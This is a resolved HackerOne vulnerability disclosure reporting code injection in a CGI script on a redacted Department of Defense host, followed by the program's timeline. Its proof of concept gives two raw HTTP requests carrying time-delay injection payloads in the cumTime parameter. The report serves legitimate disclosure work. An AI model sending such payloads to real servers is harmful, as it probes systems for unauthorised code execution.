---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/web
  - vuln/code-injection
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2020-09-03
submitted: 2020-08-09T14:54:50.075Z
bounty_usd: null
votes: 8
cve: []
program: "[[programs/deptofdefense|U.S. Dept Of Defense]]"
reporter: "e3xpl0it"
source: "https://hackerone.com/reports/954398"
title: "Сode injection host  █████████"
---
# Сode injection host  █████████

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 8 | **Program:** U.S. Dept Of Defense | **Disclosed:** 2020-09-03

- Report: [https://hackerone.com/reports/954398](https://hackerone.com/reports/954398)
- CWE: Code Injection
- Submitted: 2020-08-09T14:54:50.075Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Good day,  security team. Host █████████ vulnerable to code injection.
POC
The server makes a time delay.

POST /cgi-bin/gMapBuild.py HTTP/1.1
Host: ███
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Connection: close

mapArea=colP&cumTime=${{"sleep"%2c"13"})}${{"timeout"%2c"13"})}

or

POST /cgi-bin/gMapBuild.py HTTP/1.1
Host: ██████████
Accept: */*
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Connection: close

mapArea=colP&cumTime=${sleep(hexdec(dechex(13)))}${sleep(hexdec(dechex(13)))}

## Impact

Potential execution of arbitrary code.
https://owasp.org/www-community/attacks/Code_Injection

## Timeline

- **Report Filed**
- **2020-08-09** @U.S. Dept Of Defense: Greetings from the Department of Defense (DoD),

Thank you for supporting the DoD Vulnerability Disclosure Program (VDP).

By submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.

The VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy.  If your report is determined to be out-of-scope, it will be closed without action.

We will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.

Our goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.

Regards,

The VDP Team
- **Report Severity Updated**
- **Report Triaged**
- **Report Resolved**
- **2020-08-27** @e3xpl0it: Can we disclose this one?
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Comments Closed**
